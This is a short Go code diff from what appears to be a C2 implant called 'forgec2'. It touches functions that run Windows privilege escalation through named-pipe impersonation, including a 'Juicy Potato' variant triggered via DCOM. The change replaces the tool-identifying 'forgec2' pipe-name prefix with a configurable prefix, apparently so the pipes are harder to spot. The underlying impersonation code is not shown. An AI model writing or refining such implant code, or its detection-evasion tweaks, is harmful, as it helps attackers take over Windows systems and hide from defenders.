@@ -103,14 +103,14 @@ func handleNamedPipeImpersonate(task Task, res *TaskResult) {
 }
 
 func juicyPotato(cmd string) (string, error) {
-	pipeName := fmt.Sprintf("forgec2_jp_%08x", rng.Uint32())
+	pipeName := fmt.Sprintf("%s_jp_%08x", persistencePrefix, rng.Uint32())
 	return namedPipeImpersonateWithTrigger(cmd, pipeName, func(pn string) error {
 		return triggerDCOM(pn)
 	})
 }
 
 func namedPipeImpersonate(cmd string) (string, error) {
-	pipeName := fmt.Sprintf("forgec2_np_%08x", rng.Uint32())
+	pipeName := fmt.Sprintf("%s_np_%08x", persistencePrefix, rng.Uint32())
 	return namedPipeImpersonateWithTrigger(cmd, pipeName, nil)
 }
 
